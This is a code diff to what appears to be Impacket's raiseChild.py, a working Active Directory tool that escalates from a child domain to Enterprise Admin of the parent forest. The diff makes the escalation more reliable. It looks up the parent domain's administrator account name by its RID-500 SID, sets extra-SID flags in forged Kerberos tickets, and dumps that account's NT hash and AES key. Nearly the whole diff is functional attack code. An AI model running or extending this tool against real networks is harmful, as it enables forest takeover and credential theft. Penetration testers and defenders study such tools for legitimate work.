@@ -81,7 +81,7 @@ from impacket.dcerpc.v5.dtypes import ULONG, RPC_SID, RPC_UNICODE_STRING, FILETI
 from impacket.dcerpc.v5.nrpc import USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY
 from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.nrpc import MSRPC_UUID_NRPC, hDsrGetDcNameEx
-from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES
+from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES, LSAP_LOOKUP_LEVEL, hLsarLookupSids
 from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS
 from impacket.dcerpc.v5 import transport, drsuapi, epm, samr
 from impacket.structure import Structure
@@ -721,7 +721,7 @@ class RAISECHILD:
         target = creds['domain']
         if self.__doKerberos is True:
             # In Kerberos we need the target's name
-            machineNameOrIp = self.getMachineName(gethostbyname(target))
+            machineNameOrIp = self.getDNSMachineName(gethostbyname(target))
             logging.debug('%s is %s' % (gethostbyname(target), machineNameOrIp))
         else:
             machineNameOrIp = target
@@ -765,10 +765,10 @@ class RAISECHILD:
         s.logoff()
         return s.getServerName() + '.' + s.getServerDNSDomainName()
 
-    def getParentSid(self, parentDC, creds):
+    def getParentSidAndAdminName(self, parentDC, creds):
         if self.__doKerberos is True:
             # In Kerberos we need the target's name
-            machineNameOrIp = self.getMachineName(gethostbyname(parentDC))
+            machineNameOrIp = self.getDNSMachineName(gethostbyname(parentDC))
             logging.debug('%s is %s' % (gethostbyname(parentDC), machineNameOrIp))
         else:
             machineNameOrIp = gethostbyname(parentDC)
@@ -793,12 +793,18 @@ class RAISECHILD:
 
         domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
 
-        return domainSid
+        # Now that we have the Sid, let's get the Administrator's account name
+        sids = list()
+        sids.append(domainSid+'-500')
+        resp = hLsarLookupSids(dce, policyHandle, sids, LSAP_LOOKUP_LEVEL.LsapLookupWksta)
+        adminName = resp['TranslatedNames']['Names'][0]['Name']
+
+        return domainSid, adminName
 
     def __connectDrds(self, domainName, creds):
         if self.__doKerberos is True or creds['TGT'] is not None:
             # In Kerberos we need the target's name
-            machineNameOrIp = self.getMachineName(gethostbyname(domainName))
+            machineNameOrIp = self.getDNSMachineName(gethostbyname(domainName))
             logging.debug('%s is %s' % (gethostbyname(domainName), machineNameOrIp))
         else:
             machineNameOrIp = gethostbyname(domainName)
@@ -1083,6 +1089,8 @@ class RAISECHILD:
 
             # Let's add the extraSid
             if validationInfo['Data']['SidCount'] == 0:
+                # Let's be sure user's flag specify we have extra sids.
+                validationInfo['Data']['UserFlags'] |= 0x20
                 validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
 
             validationInfo['Data']['SidCount'] += 1
@@ -1232,7 +1240,7 @@ class RAISECHILD:
         logging.info('Raising %s to %s' % (childName, parentName))
 
         # 3) Get the parents's Enterprise Admin SID (via XXX)
-        entepriseSid = self.getParentSid(parentName, childCreds)
+        entepriseSid, adminName = self.getParentSidAndAdminName(parentName, childCreds)
         logging.info('%s Enterprise Admin SID is: %s-519' % (parentName,entepriseSid))
 
         # 4) Get the child domain's krbtgt credentials (via MS_DRSR)
@@ -1307,13 +1315,13 @@ class RAISECHILD:
         print '%s/%s:%s:%s:%s:::' % (parentName, targetUser, rid, credentials['lmhash'], credentials['nthash'])
         print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'])
 
-        targetUser = 'Administrator'
-        rid, credentials = self.getCredentials(targetUser, parentName, childCreds)
-        print '%s/%s:%s:%s:%s:::' % (parentName, targetUser, rid, credentials['lmhash'], credentials['nthash'])
-        print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, targetUser, credentials['aesKey'])
+        logging.info('Administrator account name is %s' % adminName)
+        rid, credentials = self.getCredentials(adminName, parentName, childCreds)
+        print '%s/%s:%s:%s:%s:::' % (parentName, adminName, rid, credentials['lmhash'], credentials['nthash'])
+        print '%s/%s:aes256-cts-hmac-sha1-96s:%s' % (parentName, adminName, credentials['aesKey'])
 
         adminCreds = {}
-        adminCreds['username'] = 'Administrator'
+        adminCreds['username'] = adminName
         adminCreds['password'] = ''
         adminCreds['domain'] = parentName
         adminCreds['lmhash'] = credentials['lmhash']
